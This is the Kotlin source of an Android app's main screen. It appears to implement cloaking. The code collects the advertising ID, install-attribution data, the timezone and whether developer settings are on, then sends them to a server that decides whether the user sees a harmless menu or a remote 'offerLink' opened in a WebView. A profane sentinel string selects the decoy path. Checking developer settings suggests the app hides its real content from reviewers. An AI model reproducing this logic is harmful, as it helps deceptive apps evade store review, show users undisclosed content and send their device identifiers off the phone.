package com.application.zomat.presentation.activity

import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.provider.Settings
import android.util.Log
import android.view.View
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import com.application.zomat.data.ApiFactory
import com.application.zomat.databinding.ActivityMainBinding
import com.application.zomat.presentation.MyApplication
import com.appsflyer.AppsFlyerLib
import com.facebook.FacebookSdk
import com.facebook.applinks.AppLinkData
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.onesignal.OneSignal
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.util.*


class MainActivity : AppCompatActivity() {
    private lateinit var binding: ActivityMainBinding
    private var cloL: String? = null

    private var google_adid: String = "null"
    var af_userid: String = "null"
    private var fb_deepLink = "null"
    private var tmz: String = "null"
    private var adb: String = "null"
    private var redirect_response_data: String = "null"
    private var adgroup_id: String = "null"
    private var engmnt_source: String = "null"
    private var retargeting_conversion_type: String = "null"
    private var is_incentivized: String = "null"
    private var orig_cost: String = "null"
    private var is_first_launch: String = "null"
    private var af_click_lookback: String = "null"
    private var af_cpi: String = "null"
    private var iscache: String = "null"
    private var click_time: String = "null"
    private var is_branded_link: String = "null"
    private var match_type: String = "null"
    private var adset: String = "null"
    private var af_channel: String = "null"
    private var campaign_id: String = "null"
    private var install_time: String = "null"
    private var media_source: String = "null"
    private var agency: String = "null"
    private var af_siteid: String = "null"
    private var af_status: String = "null"
    private var af_sub1: String = "null"
    private var cost_cents_USD: String = "null"
    private var af_sub5: String = "null"
    private var af_sub4: String = "null"
    private var af_sub3: String = "null"
    private var af_sub2: String = "null"
    private var adset_id: String = "null"
    private var esp_name: String = "null"
    private var campaign: String = "null"
    private var http_referrer: String = "null"
    private var is_universal_link: String = "null"
    private var is_retargeting: String = "null"
    private var adgroup: String = "null"


    private val user by lazy {
        this.getSharedPreferences("hasVisited", Context.MODE_PRIVATE)
    }
    private val visited by lazy { user.getBoolean("hasVisited", true) }


    private val link by lazy {
        this.getSharedPreferences("link", Context.MODE_PRIVATE)
    }
    private val haveLink by lazy { link.getString("link", "") }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        startWork()
    }

    private fun startWork() {

        if (visited) {
            lifecycleScope.launch(Dispatchers.IO) {
                getGoogleID()
                startInitialFb()
                withContext(Dispatchers.Main) {
                    getAppsFlyerParams()
                }
            }
            user.edit().putBoolean("hasVisited", false).apply()
        } else {
            if (haveLink.isNullOrEmpty()) {
                startActivity(Intent(this, MenuActivity::class.java))
            } else {
                Intent(this, WebViewActivity::class.java).apply {
                    putExtra("link", haveLink)
                    startActivity(this)
                }
            }
        }
    }


    private fun startInitialFb() {
        FacebookSdk.setAutoInitEnabled(true)
        FacebookSdk.fullyInitialize()
        AppLinkData.fetchDeferredAppLinkData(
            this
        ) {
            fb_deepLink = it?.targetUri.toString()
        }
    }

    private fun getGoogleID() {
        google_adid = AdvertisingIdClient.getAdvertisingIdInfo(this).id.toString()
        google_adid.let {
            OneSignal.setExternalUserId(it)
        }
    }

    private fun getAppsFlyerParams() {
        af_userid = AppsFlyerLib.getInstance().getAppsFlyerUID(this).toString()
        MyApplication.liveDataAppsFlyer.observe(this) {
            it.forEach {
                when (it.key) {
                    "redirect_response_data" -> { redirect_response_data = it.value?.toString()}
                    "adgroup_id" -> { adgroup_id = it.value?.toString()}
                    "engmnt_source" -> { engmnt_source = it.value?.toString()}
                    "retargeting_conversion_type" -> { retargeting_conversion_type = it.value?.toString()}
                    "is_incentivized" -> { is_incentivized = it.value?.toString()}
                    "orig_cost" -> { orig_cost = it.value?.toString()}
                    "is_first_launch" -> { is_first_launch = it.value?.toString()}
                    "af_click_lookback" -> { af_click_lookback = it.value?.toString()}
                    "af_cpi" -> { af_cpi = it.value?.toString()}
                    "iscache" -> { iscache = it.value?.toString()}
                    "click_time" -> { click_time = it.value?.toString()}
                    "is_branded_link" -> { is_branded_link = it.value?.toString()}
                    "match_type" -> { match_type = it.value?.toString()}
                    "adset" -> { adset = it.value?.toString()}
                    "af_channel" -> { af_channel = it.value?.toString()}
                    "campaign_id" -> { campaign_id = it.value?.toString()}
                    "install_time" -> { install_time = it.value?.toString()}
                    "media_source" -> { media_source = it.value?.toString()}
                    "agency" -> { agency = it.value?.toString()}
                    "af_siteid" -> { af_siteid = it.value?.toString()}
                    "af_status" -> { af_status = it.value?.toString()}
                    "af_sub1" -> { af_sub1 = it.value?.toString()}
                    "cost_cents_USD" -> { cost_cents_USD = it.value?.toString()}
                    "af_sub5" -> { af_sub5 = it.value?.toString()}
                    "af_sub4" -> { af_sub4 = it.value?.toString()}
                    "af_sub3" -> { af_sub3 = it.value?.toString()}
                    "af_sub2" -> { af_sub2 = it.value?.toString()}
                    "adset_id" -> { adset_id = it.value?.toString()}
                    "esp_name" -> { esp_name = it.value?.toString()}
                    "campaign" -> { campaign = it.value?.toString()}
                    "http_referrer" -> { http_referrer = it.value?.toString()}
                    "is_universal_link" -> { is_universal_link = it.value?.toString()}
                    "is_retargeting" -> { is_retargeting = it.value?.toString()}
                    "adgroup" -> { adgroup = it.value?.toString()}
                }
            }
            getSystemicData()
            setDataServer()
        }
    }

    private fun getSystemicData() {
        lifecycleScope.launch {
            tmz = TimeZone.getDefault().id
        }
        lifecycleScope.launch {
            val adb2= Settings.Secure.getInt(
                applicationContext.contentResolver,
                Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 0
            ) != 0
            adb = adb2.toString()
        }
    }

    private fun setDataServer() {
        lifecycleScope.launch {
            try {
                val container = ApiFactory.create(this@MainActivity).setDataServer(google_adid,
                    af_userid, fb_deepLink, tmz, adb, redirect_response_data, adgroup_id, engmnt_source,
                    retargeting_conversion_type, is_incentivized, orig_cost, is_first_launch, af_click_lookback,
                    af_cpi, iscache, click_time, is_branded_link, match_type, adset, af_channel,
                    campaign_id, install_time, media_source, agency, af_siteid, af_status,
                    af_sub1, cost_cents_USD, af_sub5, af_sub4, af_sub3, af_sub2, adset_id, esp_name,
                    campaign, http_referrer, is_universal_link, is_retargeting, adgroup)
                if (container.msg != null) {
                    cloL = container.msg
                }
                if (container.offerLink != null) {
                    cloL = container.offerLink
                }
                nextScreen()
            } catch (e: Exception) {
                Toast.makeText(this@MainActivity, "No Internet!", Toast.LENGTH_LONG).show()
                Log.d("errorGetData", "$e")
            }
        }
    }


    private fun nextScreen() {
        if (cloL == null || cloL == "poshel nahui") {
            startActivity(Intent(this, MenuActivity::class.java))
        } else {
            Intent(this, WebViewActivity::class.java).apply {
                link.edit().putString("link", "$cloL").apply()
                putExtra("link", cloL)
                startActivity(this)
            }
        }
    }
}